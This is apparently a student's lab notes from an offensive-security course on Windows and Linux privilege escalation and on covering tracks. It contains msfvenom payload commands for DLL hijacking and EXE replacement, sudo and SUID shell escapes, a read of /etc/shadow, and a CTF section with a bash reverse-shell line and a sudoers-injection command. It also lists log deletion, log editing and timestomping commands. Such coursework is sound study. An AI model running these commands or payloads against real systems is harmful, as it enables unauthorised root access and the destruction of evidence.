### Windows
#### Scheduled Tasks and Services
* Write Permissions
* Non-Standard Locactions
* Unquoted Executable Paths
* Vulnerabilities in Executables
* Permissions to Run as `SYSTEM`
#### DEMO: Finding vulnerable Scheduled Tasks
schtasks /query /fo LIST /v

##### DLL Stuff
* Can you rename the file?
* Can you write to the directory?
* Go to procmon:
  - filter by process name "Name of Process"
  - Filter result contains "NAME NOT FOUND"
  - filter path contains ".dll"
* MSFVENOM
  - `msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\users\student\desktop\whoami.txt' -f dll > SSPICLI.dll`
  - SCP the file over to the windows station
#### EXE Replacement
* Can you rename the file?
* Can you write to the directory?
* MSFVENOM
  - `msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\users\student\desktop\whoami.txt' -f exe > putty.exe`
* Drag and drop the payload
```
auditpol /get /category:*
auditpol /get /category:* | findstr /i "success failure"
```
#### Important Microsoft Event IDs
* 4624/4625 - Successful/failed login
* 4720 - Account created
* 4672 - Adminstrative User logged on
* 7045 - Service Created

# checking UAC settings
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
./sigcheck.exe -m -accepteula 

## DLL hijacking method demo    use when youre on a target machine 
1. create a task called "putty.exe"
2. icacls "C:\program files (x86)\putty" /grant BUILTIN\users:W
3. net use Z: "\\http://live.sysinternals.com" /persistent:yes
4. Z:\>   ./procmon.exe -accepteula
    once opened look for process name contains putty.exe
    then path contains dll
    then result is NAME NOT FOUND
5. if nothing populates then run in ps : (get-process | ?{$_.name -like "putty"}).kill() and restart process 
5a. if something is found find a dll like in this demo SSPIC.DLL
then you do:
6. on linops**    msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\users\student\desktop\whoami.txt' -f dll > SSPICLI.dll
7. on ps:
    scp student@<linops>:/path/payload/inside/WinPRivEsc/SSPICLI.dll "C:\program files (x86)\putty\SSPICLI.dll"
8. then run putty.exe or whatever executable you use, should write on notepad the result of the command you msfvenom'd 

## EXE replacement 
msfvenom: msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\users\student\desktop\whoami.txt' -f exe > putty.exe

 ## audit logging 
 auditpol /get /category:*
 auditpol /get /category:* | findstr /i "success failure"


    
#### Linux
### Resources
* [GTFOBins](https://gtfobins.github.io)
#### Sudo Gotchas!
* Commands that can access the contents of other files
* Commands that download files
* Commands that execute other commands (Like editors)
* Dangerous Commands
#### SUID/SGID
* The User that owns the file can edit the file (SUID)
* The group that owns the file can edit the file (SGID)
* Everyone can edit the file, but only one user can delete the file (Sticky Bit)
* `find / -type f -perm /4000 -ls 2>/dev/null    # Find files with specific permissions (SUID: 4000) (SGID: 2000) (BOTH: 6000)`
#### Insecure Permissions
* CRON
  - `-l  # List`
  - `-e  # Edit`
  - `contab -u <user> -l  # List crontab for specific user`
* World-Writable Files and Directories
  - * `find / -type d -perm /2 -ls 2>/dev/null`
* Dot '.' in PATH
  - Lets you execute commands that are in your present working directory
  - `export PATH=".:$PATH"`
## Covering Your Tracks
#### Artifacts
* Things that we leave behind in a system
#### NIX-ism
* First thing: unset HISTILE
* Need to be  aware of init system in use
  - SYSTEMV, upstart, SYSTEMD, to name a few
  - Determines what commands to use and logging structure
* How to tell if sysV or Systemd `ps -p 1`
#### SystemD
* Utilizes `journalctl`
* `journalctl _TRANSPORT=audit | grep 603`
#### Working with Logs
```
file /var/log/wtmp
file /var/log -type f -mmin -10 2>/dev/null
journal -f -u ssh  # using journactl following the file of ssh, if theres any ssh activity itll record entries 
journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4
```
#### Cleaning The Logs (Basic)
* Before we start cleaining, save the INODE!
  - Affect on the inode of using `mv` vs `cp` vs `cat`
##### Get rid of it
* `rm -rf /var/log/...`
##### Clear it
* `cat /dev/null > /var/log/...`
* `echo > /var/log/...`
#### Cleaning The Logs (Precise)
##### GREP (Remove)
* `egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2`
##### SED (Replace)
* `cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log`
##### Timestomp
* `touch -c -t 201603051015 1.txt    # Explicit`
* `touch -r 3.txt 1.txt    # Reference`/ takes a timestamp from another file 
#### Rsyslog
* Newer Rsyslog references `/etc/rsyslog.d/*` for settings/rules
* Older versions only uses `/etc/ryslog.conf`
* Find out with `grep "IncludeConfig /etc/rsyslog.conf` DONT USE 
```
kern.*                                                # All kernel messages, all severities
mail.crit
cron.!info,!debug
*.*  @192.168.10.254:514                                                    # Old format
*.* action(type="omfwd" target="192.168.10.254" port="514" protocol="udp")   # New format
#mail.*
```
# CTF
```
watch -n1 'ls -l'
/bin/bash -i >& /dev/tcp/192.168.28.135/33403 0>&1
/var/tmp/testbed/unknown /etc/sudoers 'comrade  ALL=(ALL:ALL) ALL'
```
sudo cat /etc/sudoers
find / -type f -perm /4000 -ls 2>/dev/null
  cross reference with gtfo bins that can give you a shel, if root owns it you are root

## in action demo 1
sudo -l  
    cross reference the binary with gtfobins

sudo apt-get changelog apt 
!/bin/sh will allow a shell on the device and now we are root 

## demo 2 
sudo -l 
as root with NO PASSWD you can run /var/log/syslog* 
ls -l /var/log/syslog* shows all the log rotations (.gz logs) 
    star means anything 
so because star is there, it means any character o we can do: cat /var/log/syslog /etc/shadow (or any file)

## demo 3 
    cant run it so we see if theres anything with suid or sgid bit with the find command: find / -type f -perm /4000 -ls 2>/dev/null

cros referencing the nice command
IGNORE THE INSTALL DIRECTORY it already has the suid bit set we dont need it 
run the nice command with a shell like so: nice /bin/sh -p
    youre given the # shell which means root do an id to see who we are, EID means effective user id so we are effectively here root 

crontab -l # lists jobs for the user you are 
crontab -e allows to edit 
crontab -r allows to remove a crontab
crontab -u -<other option> <username> allows to check and edit other users jobs 
    system level jobs are in /etc/crontab
    user level jobs are in /var/spool/cron/crontabs    #crontabs here typicaly is only accesed by root 
        ls -l /etc/cron.<h,w,m,d>

# world writeable files
find / -type d -perm /2 -ls 2>/dev/null # finds directories with the write permision set 
ls -lisa /tmp      ls -latr puts the most recently written to file at the bottom 

# dot . in path
PATH=./:$PATH  makes the directory youre in a directory the system reads for commands, for example ls in that directory can be mkdir and can run a new set of commands when called in nthat directory
echo $PATH

wayss to figure out init type 
  ls -latr /proc/1/exe
  stat /sbin/init
  man init
  init --version
  ps -p 1

  sytemv is system 5
